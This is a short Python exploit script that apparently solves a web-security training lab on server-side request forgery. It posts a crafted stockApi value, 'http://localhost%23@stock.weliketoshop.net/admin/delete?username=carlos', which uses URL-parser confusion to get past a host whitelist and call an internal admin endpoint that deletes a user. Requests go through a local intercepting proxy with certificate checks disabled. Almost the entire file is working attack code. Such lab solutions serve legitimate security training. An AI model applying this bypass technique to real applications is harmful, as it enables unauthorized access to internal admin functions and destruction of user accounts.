import requests
import sys
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
"http":"http://127.0.0.1:8080",
"https":"http://127.0.0.1:8080"
}


def delete_user(url):
    print("(+) Deleting User ...")
    delete_user_ssrf_payload = 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'
    check_path = "/product/stock"

    params = {"stockApi": delete_user_ssrf_payload }

    r = requests.post(url + check_path ,data = params , verify=False   , proxies=proxies)



    if r.status_code <= 400:
        print("(+) User Has been Deleted Successfully!!")
    else:
        print("(-) Soemthing Went Wrong :\"")



def main():
    if len(sys.argv) !=2:
        print(f"(+) Usage: {sys.argv[0]} <url>" )
        print(f"(+) Example: {sys.argv[0]} https://www.example.com" )
        sys.exit(-1)
    
    url = sys.argv[1]

    print(f"(+) Script starts  {datetime.now()} ...")
    delete_user(url)
        


if __name__ =="__main__":
    main()
